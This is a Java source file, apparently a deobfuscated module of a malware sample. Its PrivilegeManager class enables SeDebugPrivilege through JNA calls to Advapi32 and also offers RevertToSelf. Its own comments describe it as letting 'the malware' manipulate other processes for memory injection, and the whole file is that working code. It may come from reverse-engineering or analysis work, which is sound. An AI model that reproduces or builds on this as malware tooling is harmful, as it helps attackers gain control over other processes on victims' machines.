import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.platform.win32.Advapi32;

/**
 * Cleaned PrivilegeManager (formerly t.java)
 * Manages process privileges and security tokens.
 * Used to enable SeDebugPrivilege, allowing the malware to manipulate other processes.
 */
public class PrivilegeManager {

    /**
     * Enables SeDebugPrivilege for the current process.
     * This is required for cross-process memory manipulation and injection.
     */
    public static boolean enableDebugPrivilege() {
        WinNT.HANDLEByReference hToken = new WinNT.HANDLEByReference();
        if (Advapi32.INSTANCE.OpenProcessToken(Kernel32.INSTANCE.GetCurrentProcess(), WinNT.TOKEN_ADJUST_PRIVILEGES | WinNT.TOKEN_QUERY, hToken)) {
            WinNT.TOKEN_PRIVILEGES tp = new WinNT.TOKEN_PRIVILEGES(1);
            tp.Privileges[0] = new WinNT.LUID_AND_ATTRIBUTES();
            if (Advapi32.INSTANCE.LookupPrivilegeValue(null, WinNT.SE_DEBUG_NAME, tp.Privileges[0].Luid)) {
                tp.Privileges[0].Attributes = new WinDef.DWORD(WinNT.SE_PRIVILEGE_ENABLED);
                Advapi32.INSTANCE.AdjustTokenPrivileges(hToken.getValue(), false, tp, 0, null, null);
                Kernel32.INSTANCE.CloseHandle(hToken.getValue());
                return true;
            }
            Kernel32.INSTANCE.CloseHandle(hToken.getValue());
        }
        return false;
    }

    /**
     * Reverts to the original security token.
     */
    public static void revertToSelf() {
        Advapi32.INSTANCE.RevertToSelf();
    }
}
